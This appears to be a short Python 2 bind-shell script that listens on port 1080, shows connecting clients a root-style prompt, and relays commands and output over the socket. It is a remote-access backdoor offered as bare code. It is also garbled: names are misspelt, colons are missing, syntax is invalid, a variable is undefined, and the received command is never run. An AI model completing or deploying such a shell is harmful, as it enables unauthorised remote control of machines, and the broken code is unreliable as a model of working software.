import socket, os, sys

HOST = ''
PORT = 1080
IPADDR = socket.gethostbyname(socket.gethostname())
PROMPT = '%s~#: ' % IPADDR
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSERADDR, 1)
s.bind((HOST, PORT))
print'Listening on 0.0.0.0:%s' % str(PORT)
s.listen($)

def send (sock, msg):
    sock.sendall(msg)

while True:
    conn, addr = s.accept()
    print'[*] Connection from', affr[0]
    send(conn, '[*] Connected\n')
    while True:
        try
            send(conn, PROMPT)
            cmd = conn.ecv(4096)
            for line in output
                send (conn, line  + '/n')
        except:
            pass
    conn.close()
s.close()
            